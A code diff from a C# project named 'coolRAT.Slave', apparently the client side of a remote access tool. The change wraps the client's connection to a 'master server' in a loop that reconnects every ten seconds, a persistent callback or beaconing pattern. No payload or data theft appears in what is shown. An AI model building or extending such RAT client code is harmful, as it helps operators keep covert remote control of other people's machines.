@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace coolRAT.Slave
@@ -27,23 +28,28 @@ namespace coolRAT.Slave
                     break;
                 }
             }
-            // Connect the ping service
-            TcpConnection conn = new TcpConnection();
-            conn.Connect(MasterServerInfo.RemoteServer.Address.ToString(), MasterServerInfo.RemoteServer.Port);
-            ConnectPipePacket connect_packet = new ConnectPipePacket(Me.UniqueId, PipeType.Ping);
-            conn.SendPacket(connect_packet);
-            string packet_raw = conn.ReadPacket();
-            PipeConnectedPacket connectedPacket = PipeConnectedPacket.Deserialize(packet_raw);
-            if(connectedPacket.Success)
+            while(true)
             {
-                Console.WriteLine("Ping service pipe connected");
-                Me.Pipes.PingPipe = conn;
+                // Connect the ping service
+                TcpConnection conn = new TcpConnection();
+                conn.Connect(MasterServerInfo.RemoteServer.Address.ToString(), MasterServerInfo.RemoteServer.Port);
+                ConnectPipePacket connect_packet = new ConnectPipePacket(Me.UniqueId, PipeType.Ping);
+                conn.SendPacket(connect_packet);
+                string packet_raw = conn.ReadPacket();
+                PipeConnectedPacket connectedPacket = PipeConnectedPacket.Deserialize(packet_raw);
+                if (connectedPacket.Success)
+                {
+                    Console.WriteLine("Ping service pipe connected");
+                    Me.Pipes.PingPipe = conn;
+                }
+                else
+                {
+                    Console.WriteLine("Failed to connect to the main server");
+                    return;
+                }
+                Thread.Sleep(10000);
             }
-            else
-            {
-                Console.WriteLine("Failed to connect to the main server");
-                return;
-            }
+            
             Console.WriteLine("Connected to the master server!");
             Console.ReadLine();
         }
